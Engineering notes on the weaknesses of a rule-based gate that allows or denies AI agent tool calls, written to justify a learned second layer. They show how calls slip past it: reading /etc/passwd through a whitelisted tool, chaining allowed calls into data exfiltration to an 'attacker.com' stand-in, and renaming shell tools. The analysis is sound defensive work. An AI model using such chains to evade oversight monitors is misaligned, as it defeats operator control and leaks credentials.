# Layer 1 Gaps — Where Deterministic Rules Break

Engineering notes on the observed limitations of the Layer 1 policy engine.
These gaps are the evidence base for why Layer 2 exists.

Written after: Layer 1 build complete, all four tests passing, CLI verified.

---

## What Layer 1 Does Well

- Default-deny posture is correct. Every unanticipated tool call is denied and logged.
- Whitelist/blacklist separation is clean. Intent is explicit and auditable.
- Every decision — including gaps — lands in the audit log. Nothing is silent.
- The CLI surfaces gap-zone hits immediately via `audit --gaps`.

These are not small things. A large portion of agentic risk comes from tools that
*are* anticipated but have no governance at all. Layer 1 eliminates that class
of failure entirely.

---

## Gap 1 — Parameter Blindness

**The problem:** Rules match on tool name only. The input parameters are hashed
for audit integrity but never inspected by the policy engine.

**What this means in practice:**

```
read_file(path="/tmp/report.txt")     -> ALLOWED  (benign)
read_file(path="/etc/passwd")         -> ALLOWED  (credential harvesting)
web_search(query="weather in NYC")    -> ALLOWED  (benign)
web_search(query="CVE-2024 exploit")  -> ALLOWED  (reconnaissance)
```

Both calls hit the whitelist. The policy cannot distinguish between them.
The tool name is safe. The intent encoded in the parameters is not.

**Why Layer 1 cannot fix this:** Deterministic rules would require enumerating
every dangerous parameter value or pattern — an impossible maintenance burden
that would break on any novel input. This is a semantic problem, not a
structural one. It requires probabilistic or contextual reasoning.

---

## Gap 2 — Sequential Composition (Tool Chaining)

**The problem:** Each tool call is evaluated in isolation. The gate has no memory
of prior decisions within a session.

**The `rename_file` example from the test fixtures:**

```
rename_file(src="/tmp/internal_report.txt", dst="/tmp/public/internal_report.txt")
-> DENIED (no_matching_rule)
```

This call is denied — but only because `rename_file` was never whitelisted, not
because the engine understood what was happening. If `rename_file` had been
whitelisted as a "harmless file operation," the following chain would pass
without triggering a single rule:

```
Step 1: read_file(path="/etc/passwd")                    -> ALLOWED (whitelist)
Step 2: write_file(path="/tmp/output.txt", ...)          -> DENIED  (blacklist)
```

Swap `write_file` for a whitelisted alternative and the chain completes:

```
Step 1: read_file(path="/etc/passwd")                    -> ALLOWED
Step 2: rename_file(src="/etc/passwd", dst="/tmp/pub/")  -> ALLOWED (if whitelisted)
Step 3: web_search(query="site:attacker.com/?data=...")  -> ALLOWED
```

Each hop is clean. The cumulative result is data exfiltration. This is the
core thesis of the project: individually-scoped components can compose into
privilege escalation without any single call violating its rules.

This is OWASP LLM08 / Excessive Agency — the exact attack class the gate
header comment warns about. Layer 1 cannot detect it by design.

---

## Gap 3 — Policy Completeness Is an Unsolvable Maintenance Problem

**The problem:** The whitelist requires enumerating every safe tool explicitly.
Any tool not on the list is denied — which is the correct default posture —
but the policy author cannot anticipate every tool name an agent might call.

The `no_matching_rule` audit rows are proof of this gap in real time.

As the tool registry grows (new integrations, new agent capabilities), the
whitelist must be manually updated or every new tool is denied by default.
This creates operational pressure to relax the policy — to add tools to the
whitelist "just to make things work" without rigorous threat modeling.

That operational pressure is itself a governance risk.

**What Layer 2 needs:** A mechanism to assess whether an unanticipated tool
call is likely safe or dangerous based on behavioral signals, without requiring
the policy author to enumerate it explicitly.

---

## Gap 4 — No Temporal or Frequency Reasoning

**The problem:** The gate evaluates each call independently with no awareness
of rate, sequence, or time.

A single `web_search` call is benign. Fifty `web_search` calls in ten seconds
may indicate automated reconnaissance. The Layer 1 gate cannot distinguish
these cases — both return `ALLOWED` with the same rule triggered.

Similarly, the gate cannot detect:
- Repeated probing of denied tools (testing the boundary)
- Escalating blast radius across a session
- Calls that are individually low-risk but collectively anomalous

**What Layer 2 needs:** A baseline model of normal call frequency and
distribution. Deviation from baseline is the signal.

---

## Gap 5 — Name-Based Matching Has No Semantic Understanding

**The problem:** Rules match on exact string equality. There is no concept of
tool similarity, intent category, or risk class.

```
execute_shell  -> DENIED  (blacklist)
run_command    -> DENIED  (no_matching_rule — not on blacklist)
shell_exec     -> DENIED  (no_matching_rule — not on blacklist)
```

`run_command` and `shell_exec` are effectively the same capability as
`execute_shell`. Layer 1 denies them — but only because they were never
whitelisted, not because the engine recognized them as shell execution.

If any of these were whitelisted by mistake, the gate would not flag the
semantic equivalence. The policy author must manually maintain that
equivalence through naming conventions — an unreliable approach.

---

## Summary — What Layer 2 Must Address

| Gap | Layer 1 Behavior | Layer 2 Requirement |
|-----|-----------------|---------------------|
| Parameter blindness | Ignores input values | Semantic risk scoring on parameters |
| Tool chaining | No session memory | Sequence-aware anomaly detection |
| Policy completeness | Manual whitelist maintenance | Behavioral baseline for unanticipated tools |
| Frequency / rate | Every call treated equally | Temporal anomaly detection |
| Semantic equivalence | Exact name match only | Tool intent classification |

The audit log's `no_matching_rule` rows are the primary data feed for Layer 2.
Every gap hit is a labeled training signal: a tool call the deterministic
policy could not reason about. That is the dataset Layer 2 is built on.
